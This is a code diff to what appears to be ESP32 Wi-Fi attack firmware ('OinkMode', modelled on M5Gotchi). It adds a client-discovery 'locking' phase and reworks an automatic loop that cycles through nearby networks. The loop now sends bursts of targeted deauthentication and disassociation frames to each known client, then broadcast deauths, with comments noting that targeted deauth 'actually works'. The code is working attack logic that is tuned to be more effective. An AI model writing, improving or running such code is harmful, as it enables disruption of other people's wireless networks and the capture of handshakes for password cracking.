@@ -44,6 +44,7 @@ static uint32_t lastMoodUpdate = 0;
 // Auto-attack state machine (like M5Gotchi)
 enum class AutoState {
     SCANNING,       // Scanning for networks
+    LOCKING,        // Locked to target channel, discovering clients
     ATTACKING,      // Deauthing + sniffing target
     WAITING,        // Delay between attacks
     NEXT_TARGET     // Move to next target
@@ -52,6 +53,7 @@ static AutoState autoState = AutoState::SCANNING;
 static uint32_t stateStartTime = 0;
 static uint32_t attackStartTime = 0;
 static const uint32_t SCAN_TIME = 5000;         // 5 sec initial scan
+static const uint32_t LOCK_TIME = 3000;         // 3 sec to discover clients before attacking
 static const uint32_t ATTACK_TIMEOUT = 15000;   // 15 sec per target
 static const uint32_t WAIT_TIME = 2000;         // 2 sec between targets
 
@@ -187,16 +189,41 @@ void OinkMode::update() {
                 
                 selectionIndex = nextIdx;
                 
-                // Select this target
+                // Select this target (locks to channel, stops hopping)
                 selectTarget(selectionIndex);
-                networks[selectionIndex].attackAttempts++;  // Track attempts
-                autoState = AutoState::ATTACKING;
-                attackStartTime = now;
-                deauthCount = 0;
-                Serial.printf("[OINK] Auto-attacking: %s (%d clients, attempt #%d)\n", 
+                networks[selectionIndex].attackAttempts++;
+                
+                // Go to LOCKING state to discover clients before attacking
+                autoState = AutoState::LOCKING;
+                stateStartTime = now;
+                deauthing = false;  // Don't deauth yet, just listen
+                
+                Serial.printf("[OINK] Locking to %s (ch%d) - discovering clients...\n", 
                              networks[selectionIndex].ssid,
-                             networks[selectionIndex].clientCount,
-                             networks[selectionIndex].attackAttempts);
+                             networks[selectionIndex].channel);
+                Mood::setStatusMessage("Sniffing clients...");
+            }
+            break;
+            
+        case AutoState::LOCKING:
+            // Wait on target channel to discover clients via data frames
+            // This is crucial - targeted deauth is much more effective
+            if (now - stateStartTime > LOCK_TIME) {
+                if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
+                    DetectedNetwork* target = &networks[targetIndex];
+                    
+                    Serial.printf("[OINK] Starting attack on %s (%d clients found, attempt #%d)\n",
+                                 target->ssid, target->clientCount, target->attackAttempts);
+                    
+                    if (target->clientCount == 0) {
+                        Serial.println("[OINK] WARNING: No clients found - broadcast deauth only (less effective)");
+                    }
+                    
+                    autoState = AutoState::ATTACKING;
+                    attackStartTime = now;
+                    deauthCount = 0;
+                    deauthing = true;
+                }
             }
             break;
             
@@ -215,19 +242,23 @@ void OinkMode::update() {
                     
                     uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                     
-                    // Burst broadcast deauth (3 packets)
-                    sendDeauthBurst(target->bssid, broadcast, 3);
-                    deauthCount += 3;
-                    
-                    // Also send disassoc
-                    sendDisassocFrame(target->bssid, broadcast, 8);
-                    
-                    // Target specific clients if we know any
-                    for (int c = 0; c < target->clientCount && c < 4; c++) {
-                        // Deauth specific client (more effective)
-                        sendDeauthBurst(target->bssid, target->clients[c].mac, 2);
-                        deauthCount += 2;
+                    // PRIORITY 1: Target specific clients (MOST EFFECTIVE)
+                    // Targeted deauth is much more reliable than broadcast
+                    if (target->clientCount > 0) {
+                        for (int c = 0; c < target->clientCount && c < MAX_CLIENTS_PER_NETWORK; c++) {
+                            // Send more targeted deauths - these actually work
+                            sendDeauthBurst(target->bssid, target->clients[c].mac, 5);
+                            deauthCount += 5;
+                            
+                            // Also disassoc targeted client
+                            sendDisassocFrame(target->bssid, target->clients[c].mac, 8);
+                        }
                     }
+                    
+                    // PRIORITY 2: Broadcast deauth (less effective, but catches unknown clients)
+                    // Only send 1 broadcast per cycle to reduce noise
+                    sendDeauthFrame(target->bssid, broadcast, 7);
+                    deauthCount++;
                     
                     lastDeauthTime = now;
                 }
@@ -236,7 +267,12 @@ void OinkMode::update() {
             // Update mood with attack progress
             if (now - lastMoodUpdate > 2000) {
                 if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
-                    Mood::onDeauthing(networks[targetIndex].ssid, deauthCount);
+                    DetectedNetwork* target = &networks[targetIndex];
+                    Mood::onDeauthing(target->ssid, deauthCount);
+                    
+                    // Log attack status including client count
+                    Serial.printf("[OINK] Attacking %s: %d deauths, %d clients tracked\n",
+                                 target->ssid, deauthCount, target->clientCount);
                 }
                 lastMoodUpdate = now;
             }
